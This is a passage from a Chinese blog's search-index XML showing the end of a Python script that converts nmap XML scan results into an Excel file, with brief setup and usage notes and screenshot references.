args.outfile</span><br><span class="line"><span class="keyword">if</span> xml:</span><br><span class="line">excelfile,sheet = excelcsh()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">parsexml(xml,sheet)</span><br><span class="line"><span class="keyword">except</span> FileExistsError <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;xml文件不存在&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line">excelfile.save(outpath)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;文件保存至 %s&quot;</span> % outpath)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Error args&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;eg: python3 pythonXml.py -x nmap.xml -o nmap.xls&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="3-怎么用"><a href="#3-怎么用" class="headerlink" title="3. 怎么用"></a>3. 怎么用</h5><p>因为每个人的习惯都不同，写的鬼东西自己感觉方便，别人看来可能都运行不起来，所以简单说明一下<br>a. 需要安装xlwt库，命令行中运行: pip install xlwt<br>b. 需要用python3.x运行，python2的兄弟可以把 print() 改成 print ，同时把开头效验版本的if语句注释掉<br>c. python3 nmapxml2excel -x test.xml -o test.xls</p><h3 id="四、补充"><a href="#四、补充" class="headerlink" title="四、补充"></a>四、补充</h3><ol><li><p>nmap扫描端口和服务</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/2.png" alt="2"></p></li><li><p>脚本过滤</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/3.png" alt="3"></p></li><li><p>excel内容</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/4.png" alt="4"></p></li><li><p>批量结果处理</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/5.png" alt="5"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> py脚本 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
